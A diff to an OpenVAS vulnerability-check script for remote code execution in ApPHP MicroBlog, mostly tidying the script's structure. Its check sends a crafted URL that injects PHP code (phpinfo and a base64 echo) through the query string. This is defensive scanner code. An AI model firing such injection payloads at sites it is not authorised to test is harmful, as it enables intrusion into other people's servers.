@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apphp_rce_05_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
+# $Id: gb_apphp_rce_05_14.nasl 5698 2017-03-23 14:04:51Z cfi $
 #
 # ApPHP MicroBlog Remote Code Execution Vulnerability
 #
@@ -25,8 +25,6 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.105020";
-
 tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
 commands in the context of the affected application.";
 
@@ -37,19 +35,14 @@ tag_vuldetect = "Send a special crafted HTTP GET request and chech the response.
 
 if (description)
 {
- script_oid(SCRIPT_OID);
- script_version ("$Revision: 2780 $");
+ script_oid("1.3.6.1.4.1.25623.1.0.105020");
+ script_version ("$Revision: 5698 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_name("ApPHP MicroBlog Remote Code Execution Vulnerability");
-
-
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33070/");
- 
- script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 15:04:51 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2014-05-08 12:48:21 +0200 (Thu, 08 May 2014)");
- script_summary("Determine if it is possible to execute a command");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -68,32 +61,25 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port( default:80 );
-if( ! get_port_state( port ) ) exit( 0 );
-
 if( ! can_host_php( port:port ) ) exit( 0 );
 
-dirs = make_list( "/blog", cgi_dirs());
+foreach dir( make_list_unique( "/blog", cgi_dirs( port:port ) ) ) {
 
-foreach dir ( dirs )
-{
-  url = dir + '/index.php';
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  res = http_get_cache( item:url, port:port );
 
-  if( http_vuln_check( port:port, url:url, pattern:"ApPHP MicroBlog" ) )
-  {
+  if( "ApPHP MicroBlog" >< res ) {
     url = dir + "/index.php?b);phpinfo();echo(base64_decode('T3BlblZBUwo')=/";
-    if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) )
-    {  
+    if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) ) {  
       report = report_vuln_url( port:port, url:url );
-      security_message(port:port, data:report);
-      exit(0);
+      security_message( port:port, data:report );
+      exit( 0 );
     }  
   }
 }
 
-exit(0);
-
+exit( 99 );
